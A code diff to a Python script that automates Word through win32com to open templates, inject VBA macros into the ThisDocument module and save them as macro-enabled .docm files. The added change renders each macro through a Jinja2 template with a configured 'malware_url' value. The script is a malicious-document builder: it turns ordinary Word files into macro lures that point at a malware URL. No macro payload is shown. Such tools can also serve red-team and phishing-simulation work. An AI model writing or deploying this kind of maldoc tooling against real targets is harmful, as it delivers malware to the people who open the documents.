@@ -2,6 +2,7 @@ import win32com.client as win32
 import os
 import sys
 import yaml
+from jinja2 import Template
 
 cfg = None
 parent_dir = os.path.dirname(os.path.abspath(__file__))
@@ -16,20 +17,27 @@ with open(config_file, "r") as stream:
         print(f"Error reading configuration from '{config_file}': {exc}")
         sys.exit(1)
 
+
 def load_word_template(template_path):
     app = win32.gencache.EnsureDispatch('Word.Application')
     app.Visible = False
     doc = app.Documents.Open(template_path)
     return app, doc
 
-def insert_macro_from_file(macro_path, target_app):
-    with open(macro_path, 'r') as macro_file:
-        macro_content = macro_file.read()
 
-    target_macros = target_app.VBE.VBProjects(1).VBComponents
-    new_macro = target_macros.Add(1)
-    new_macro.CodeModule.AddFromString(macro_content)
-    
+def insert_macro_from_file(macro_path, target_doc):
+    with open(macro_path, 'r') as macro_file:
+        macro_template = Template(macro_file.read())
+
+    # Add the value from cfg["app"]["malware_url"] to the template
+    rendered_macro = macro_template.render(
+        malware_url=cfg["app"]["malware_url"])
+
+    target_vba_project = target_doc.VBProject
+    target_vba_project.VBComponents(
+        "ThisDocument").CodeModule.AddFromString(rendered_macro)
+
+
 def main(template_id, macro_id):
     # Get template path from config using template_id
     template_name = cfg['templates']['word'][template_id]
@@ -39,7 +47,8 @@ def main(template_id, macro_id):
     word_app, template_doc = load_word_template(template_path)
 
     # Save the new document in the output folder
-    new_doc_path = os.path.join(output_dir, os.path.splitext(os.path.basename(template_name))[0])
+    new_doc_path = os.path.join(output_dir, os.path.splitext(
+        os.path.basename(template_name))[0])
     new_doc_path += ".docm"
     template_doc.SaveAs(new_doc_path, FileFormat=13)
     template_doc.Close()
@@ -58,6 +67,7 @@ def main(template_id, macro_id):
     # Close the documents
     new_doc.Close()
     word_app.Quit()
+
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
